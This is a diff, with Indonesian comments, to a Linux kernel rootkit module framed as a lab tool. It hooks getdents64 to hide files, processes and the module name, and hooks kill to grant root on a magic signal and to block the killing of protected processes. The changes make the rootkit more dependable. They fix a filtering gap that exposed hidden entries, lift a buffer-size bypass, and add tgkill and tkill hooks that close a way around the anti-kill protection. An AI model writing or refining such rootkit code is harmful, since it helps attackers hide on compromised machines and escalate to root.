@@ -7,7 +7,8 @@
 // Fitur (full stealth pack, semua via module_param):
 //   - hide file/dir: entry getdents64 yang mengandung hide_prefix -> difilter
 //   - hide proses  : PID yang comm-nya mengandung proc_prefix, atau == hide_pid
-//   - hide module  : hapus dari /proc/modules + /sys/module (list_del+kobject_del)
+//   - hide module  : sembunyikan NAMA modul dari listing direktori (/sys/module);
+//                    /proc/modules (lsmod) tetap menampilkan modul dan rmmod selalu jalan
 //   - privesc       : kill(<pid>, SIG_MAGIC) -> commit_creds(root) untuk caller
 //   - anti-kill     : kill() ke PID proteksi (protect_pid / proc_prefix) -> -EPERM
 //
@@ -18,7 +19,7 @@
 //   dmesg | tail
 //
 // Default aman untuk lab: prefix "rk_", signal 64, modul disembunyikan.
-// Hapus dengan rmmod tetap bisa (delete_module tidak lewat list).
+// Hapus dengan rmmod selalu bisa: module->list tidak pernah diubah.
 
 #include <linux/cred.h>
 #include <linux/capability.h>
@@ -218,12 +219,14 @@ static void unhide_this_module(void);
 static void hide_this_module(void);
 
 // State hide-module dibaca hook getdents64 (didefinisikan di bawah).
-static struct list_head *prev_module = NULL;
+// Tidak ada pointer list: modul tidak pernah dikeluarkan dari module->list.
 static bool module_hidden = false;
 
 // ---- orig pointers ----
 static asmlinkage long (*orig_getdents64)(const struct pt_regs *);
 static asmlinkage long (*orig_kill)(const struct pt_regs *);
+static asmlinkage long (*orig_tgkill)(const struct pt_regs *);
+static asmlinkage long (*orig_tkill)(const struct pt_regs *);
 
 // ---- hook getdents64: filter file + PID tersembunyi ----
 // Buffer vmalloc fixed-size (bukan kmalloc(n) dinamis): hardened usercopy
@@ -249,31 +252,32 @@ static int name_has_mark(const char *name, size_t maxlen, const char *mark) {
 
 #define DIRENT64_HDR (sizeof(__u64) * 2 + sizeof(__u16) + sizeof(unsigned char))
 
-#define GHOST_BUFSZ (32 * PAGE_SIZE)
-
 static asmlinkage long hook_getdents64(const struct pt_regs *regs) {
-    long n = orig_getdents64(regs);
-    char __user *buf;
-    char *tmp = NULL;
-    long in = 0, out = 0;
+    char __user *buf = (char __user *)regs->si;
+    long n, in, out;
+    char *tmp;
     struct linux_dirent64 *e;
 
+    /* Filter dijalankan sampai satu batch menghasilkan isi. Tanpa loop,
+     * batch yang seluruhnya tersembunyi mengembalikan 0 = EOF palsu bagi
+     * pemanggil, sehingga entry pada batch berikutnya tidak pernah dibaca.
+     * Alokasi mengikuti n (bukan buffer tetap): buffer besar tidak lagi
+     * melewati filter. */
+    for (;;) {
+    n = orig_getdents64(regs);
     if (n <= 0)
         return n;
-    if (n > GHOST_BUFSZ)
-        return n; // batch raksasa: lewati filter batch ini
-
-    buf = (char __user *)regs->si;
     if (!access_ok(buf, n))
         return n;
-
-    tmp = vmalloc(GHOST_BUFSZ);
+    tmp = vmalloc(n);
     if (!tmp)
         return n;
     if (copy_from_user(tmp, buf, n)) {
         vfree(tmp);
         return n;
     }
+    in = 0;
+    out = 0;
 
     while (in < n) {
         int hide = 0;
@@ -301,8 +305,9 @@ static asmlinkage long hook_getdents64(const struct pt_regs *regs) {
             pid_t pid = 0;
             const char *p = e->d_name;
             int numeric = 1;
+            int digits = 0;
             while (*p) {
-                if (*p < '0' || *p > '9') {
+                if (*p < '0' || *p > '9' || ++digits > 10) {
                     numeric = 0;
                     break;
                 }
@@ -326,7 +331,10 @@ static asmlinkage long hook_getdents64(const struct pt_regs *regs) {
         return n; // gagal tulis balik: kembalikan asli daripada rusak
     }
     vfree(tmp);
-    return out;
+    if (out > 0)
+        return out;
+    /* Semua entry batch ini disembunyikan: ambil batch berikutnya. */
+    }
 }
 
 // ---- hook kill: privesc + anti-kill ----
@@ -334,48 +342,88 @@ static asmlinkage long hook_kill(const struct pt_regs *regs) {
     pid_t pid = (pid_t)regs->di;
     int sig = (int)regs->si;
 
-    if (sig == sig_magic) {
+    // sig_magic bisa diubah runtime menjadi 0 lewat /sys/module/.../parameters.
+    // kill(pid, 0) adalah uji eksistensi biasa; tanpa guard ini, siapa pun bisa
+    // memicunya untuk privesc.
+    if (sig_magic > 0 && sig == sig_magic) {
         pr_info("[rk] magic signal %d dari pid %d -> privesc\n", sig, current->pid);
         give_root();
         return 0;
     }
-    if (sig == sig_unhide) {
+    if (sig_unhide > 0 && sig == sig_unhide) {
         pr_info("[rk] unhide signal %d dari pid %d\n", sig, current->pid);
         unhide_this_module();
         return 0;
     }
-    if (pid_protected(pid) && (sig == SIGKILL || sig == SIGTERM || sig == SIGSTOP)) {
+    if ((pid == 0 || pid_protected(pid) || (pid < 0 && pid_protected(-pid))) &&
+        (sig == SIGKILL || sig == SIGTERM || sig == SIGSTOP)) {
         pr_info("[rk] kill(%d, %d) ditolak (proteksi)\n", pid, sig);
         return -EPERM;
     }
     return orig_kill(regs);
 }
 
+// tgkill(2)/tkill(2) melewati hook kill() di atas; tanpa ini proteksi bisa
+// dilewati dengan satu syscall lain.
+static asmlinkage long hook_tgkill(const struct pt_regs *regs) {
+    const pid_t tgid = (pid_t)regs->di;
+    const pid_t tid = (pid_t)regs->si;
+    const int sig = (int)regs->dx;
+    if (sig_magic > 0 && sig == sig_magic) {
+        give_root();
+        return 0;
+    }
+    if (sig_unhide > 0 && sig == sig_unhide) {
+        unhide_this_module();
+        return 0;
+    }
+    if ((pid_protected(tid) || pid_protected(tgid)) &&
+        (sig == SIGKILL || sig == SIGTERM || sig == SIGSTOP)) {
+        pr_info("[rk] tgkill(%d, %d, %d) ditolak (proteksi)\n", tgid, tid, sig);
+        return -EPERM;
+    }
+    return orig_tgkill(regs);
+}
+
+static asmlinkage long hook_tkill(const struct pt_regs *regs) {
+    const pid_t tid = (pid_t)regs->di;
+    const int sig = (int)regs->si;
+    if ((pid_protected(tid)) && (sig == SIGKILL || sig == SIGTERM || sig == SIGSTOP)) {
+        return -EPERM;
+    }
+    return orig_tkill(regs);
+}
+
 static struct ftrace_hook hooks[] = {
     { .name = "__x64_sys_getdents64", .func = hook_getdents64, .orig = &orig_getdents64 },
     { .name = "__x64_sys_kill", .func = hook_kill, .orig = &orig_kill },
+    { .name = "__x64_sys_tgkill", .func = hook_tgkill, .orig = &orig_tgkill },
+    { .name = "__x64_sys_tkill", .func = hook_tkill, .orig = &orig_tkill },
 };
 // ---- hide module ----
-// Hanya list_del (sembunyi dari /proc/modules = lsmod). sysfs SENGAJA tidak
-// dihapus: kobject_del merusak atribut holders/sections sehingga rmmod via
-// libkmod gagal permanen ("could not open holders"). Tutupi /sys/module via
-// filter getdents64 (hook di atas menyembunyikan nama modul ini juga), dan
-// kembalikan list sebelum rmmod via sinyal unhide.
+// TIDAK memutasi module->list lagi. list_del() tanpa module_mutex (tidak
+// diekspor ke LKM) adalah race dengan /proc/modules dan, yang lebih buruk,
+// delete_module() mencari modul lewat list yang sama sehingga modul yang
+// di-hide tidak bisa di-rmmod (dan prev_module bisa dangling -> list
+// corruption / UAF).
+//
+// Yang dilakukan sekarang: sembunyikan NAMA modul ini dari listing direktori
+// (getdents64, termasuk /sys/module) lewat module_hidden. /proc/modules
+// (lsmod) tetap menampilkan modul — batas ini didokumentasikan di README.
+// Keuntungan: rmmod selalu bekerja normal, tidak ada state list yang bisa
+// merusak kernel.
 static void hide_this_module(void) {
     if (module_hidden)
         return;
-    prev_module = THIS_MODULE->list.prev;
-    list_del(&THIS_MODULE->list);
     module_hidden = true;
-    pr_info("[rk] modul disembunyikan dari lsmod (sysfs dicover via getdents filter)\n");
+    pr_info("[rk] nama modul disembunyikan dari listing direktori (list kernel TIDAK diubah)\n");
 }
 
 static void unhide_this_module(void) {
     if (!module_hidden)
         return;
-    list_add(&THIS_MODULE->list, prev_module);
     module_hidden = false;
-    pr_info("[rk] modul dimunculkan kembali, silakan rmmod\n");
+    pr_info("[rk] nama modul terlihat lagi\n");
 }
 
 static int __init rk_init(void) {
@@ -392,6 +440,12 @@ static int __init rk_init(void) {
     }
     if (sig_unhide < 1 || sig_unhide > 64) {
         pr_err("[rk] sig_unhide=%d di luar 1..64\n", sig_unhide);
+        return -EINVAL;
+    }
+    // Jika keduanya sama, cabang magic selalu menang dan modul tidak pernah
+    // bisa dimunculkan lagi.
+    if (sig_magic == sig_unhide) {
+        pr_err("[rk] sig_magic == sig_unhide (%d): tolak load\n", sig_magic);
         return -EINVAL;
     }
 
